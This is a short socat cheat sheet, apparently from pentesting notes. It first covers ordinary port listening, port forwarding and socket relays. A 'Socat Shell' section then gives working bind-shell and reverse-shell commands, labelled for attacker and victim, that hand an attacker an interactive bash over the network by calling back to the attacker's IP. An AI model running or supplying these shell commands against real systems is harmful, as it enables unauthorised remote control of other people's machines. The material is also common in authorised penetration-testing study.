### SoCat

```bash
Format:
socat [options] <address> <address>


Listen on Specific Port
We can instruct socat to listen on a specific port e.g 80 
via the TCP protocol and print out any associated findings via STDOUT
$socat TCP4-LISTEN:80 STDOUT

Connect to Remote Server on Port
$socat – TCP4:remote_server_ip:80

TCP Port Forwarder
Port 81 connections can be forwarded to port 80
$socat TCP4-LISTEN:81 TCP4:192.168.122.1:80

Listening to Local Port
$socat TCP4-LISTEN:www TCP4:remote_IP:www

Listening to Specific Port on Remote Socket
$socat TCP-LISTEN:3309,reuseaddr,fork \
UNIX-CONNECT:/var/lib/mysql/mysql.sock


```

### Socat Shell

```bash
Bind Shell
victim> socat TCP-LISTEN:1337,reuseaddr,fork \
EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337

Reverse Shell
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 \
EXEC:bash,pty,stderr,setsid,sigint,sane
```


